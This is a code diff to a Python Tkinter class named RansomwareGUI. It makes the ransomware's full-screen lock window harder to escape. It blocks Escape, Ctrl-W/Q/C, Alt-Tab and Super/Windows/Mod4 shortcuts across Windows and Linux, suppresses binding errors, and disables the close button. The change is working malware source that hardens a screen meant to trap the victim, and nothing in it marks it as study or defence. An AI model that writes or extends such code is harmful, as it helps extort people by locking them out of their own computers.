@@ -248,14 +248,28 @@ class RansomwareGUI:
         master.overrideredirect(True)  # Remove window decorations
         
         # Disable all common escape methods
-        master.bind('<Escape>', lambda e: None)
-        master.bind('<Control-w>', lambda e: None)
-        master.bind('<Control-q>', lambda e: None)
-        master.bind('<Control-c>', lambda e: None)
-        master.bind('<Alt-Tab>', lambda e: None)
-        master.bind('<Alt-Shift-Tab>', lambda e: None)
-        master.bind('<Super-Tab>', lambda e: None)
-        master.bind('<Super-d>', lambda e: None) # Disable show desktop
+        def safe_bind(sequence, func):
+            try:
+                master.bind(sequence, func)
+            except Exception:
+                pass # Ignore invalid keysyms for this OS
+
+        safe_bind('<Escape>', lambda e: None)
+        safe_bind('<Control-w>', lambda e: None)
+        safe_bind('<Control-q>', lambda e: None)
+        safe_bind('<Control-c>', lambda e: None)
+        safe_bind('<Alt-Tab>', lambda e: None)
+        safe_bind('<Alt-Shift-Tab>', lambda e: None)
+        
+        # Super key handling (Windows/Mod4)
+        safe_bind('<Super-Tab>', lambda e: None) 
+        safe_bind('<Win_L-Tab>', lambda e: None)  # Windows specific
+        safe_bind('<Mod4-Tab>', lambda e: None)   # Linux/X11 specific
+        
+        safe_bind('<Super-d>', lambda e: None)
+        safe_bind('<Win_L-d>', lambda e: None)
+        safe_bind('<Mod4-d>', lambda e: None)
+        
         master.protocol("WM_DELETE_WINDOW", lambda: None) # Disable close button
         
         # Aggressive Loop
